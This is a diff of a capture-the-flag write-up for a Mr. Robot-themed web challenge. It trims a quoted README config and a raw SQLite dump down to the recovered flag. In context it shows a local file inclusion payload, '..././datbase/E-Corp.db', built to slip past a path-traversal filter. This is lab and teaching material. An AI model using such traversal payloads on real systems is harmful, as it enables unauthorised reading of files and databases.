@@ -151,23 +151,7 @@ We will do Directory Bruteforce attack to search for the file that contains the 
 
 `/README.md` :
 
->### E-CORP config ###
->Allsafe Cybersecurity Group 
->
->all data stored in SQLite database
-><!-- Website default config -->
->Modify config values in `./application/config/config.php`.
->
->- error reporting level
->- database path
->- pages
->- default page
->- security
->
->### Current config recap ###
->
-><!-- Development config -->
->
+
 >$config = array();
 >
 >// Environment
@@ -200,7 +184,7 @@ we will include it  using  Payload `..././datbase/E-Corp.db`
 Results : 
 
 
->SQLite format 3@ .;� ����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�5�QtableempempCREATE TABLE emp ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL UNIQUE, description TEXT NOT NULL, image TEXT NOT NULL, secret TINYINT NOT NULL )%9indexsqlite_autoindex_emp_1emp ~0V _�~�4�5�1 SecretDatabase encrypted & secured by Allsafe Cybersecurity Group flag{LFI_l00k5_s0_c00l}.https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/c440cf7a-e325-4f07-9bf5-e253ea414d7b/d9gp63e-d5e5a516-9878-4acc-9934-2434945d0e15.jpg/v1/fill/w_622,h_350,q_70,strp/allsafe_by_threebik_d9gp63e-350t.jpg�''=�Scott KnowlesChief Technology Officerhttps://vignette.wikia.nocookie.net/mrrobot/images/d/d2/Scott.png/revision/latest/scale-to-width-down/310?cb=20150829181743�t)�=�Tyrell WellickSenior Vice President of Technology (former), Hacker, Chief Technology Officer (current)https://vignette.wikia.nocookie.net/mrrobot/images/1/1a/Mr.-Robot-1x04-3.jpg/revision/latest/scale-to-width-down/310?cb=20150725100044�W#��Terry Colbycareer executive, formerly Chief Technology Officer (CTO) of E Corphttps://vignette.wikia.nocookie.net/mrrobot/images/5/54/Terry_Colby.png/revision/latest/scale-to-width-down/310?cb=20150602173801�M')�cPhillip PriceCEO of E Corp.https://vignette.wikia.nocookie.net/mrrobot/images/d/dd/Tumblr_e4e0d09f125afbdd165cd11b97acba0c_3553aa05_1280.jpg/revision/latest/scale-to-width-down/310?cb=20190928214408 ������ Secret'Scott Knowles)Tyrell Wellick#Terry Colby' Phillip Price ��emp 
+>flag{LFI_l00k5_s0_c00l}
 
 
 
